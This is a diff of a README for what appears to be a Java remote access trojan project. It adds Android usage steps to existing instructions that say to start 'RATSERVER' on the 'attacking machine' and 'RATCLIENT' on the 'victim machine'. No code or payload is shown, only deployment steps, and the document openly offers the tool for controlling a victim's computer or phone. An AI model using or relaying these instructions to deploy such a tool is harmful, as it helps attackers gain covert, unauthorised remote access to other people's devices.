@@ -21,10 +21,22 @@ B.S. Troy - Chemistry - Mathmatics//
 
   ~~~~~~~~~~~~~~~~
   
-USAGE:
+Regular USAGE:
   @@@@
   1. Start the RATSERVER ON ATTACKING MACHINE (command: java RATSERVER)
   @@@@
   2. Start the RATCLIENT on VICTIM MACHINE (command: java <hostip>)
   @@@@
 .............................................................................................................................
+
+Android USAGE:
+@@@@
+1. Create new Android Project
+@@@@
+2. Create a Relative layout with scrollView , editText, and button.
+@@@@
+3. Copy classes
+@@@@
+4. Start the Application on an Android Device or VM
+@@@@
+5. Start the RATCLIENT on VICTIM MACHINE
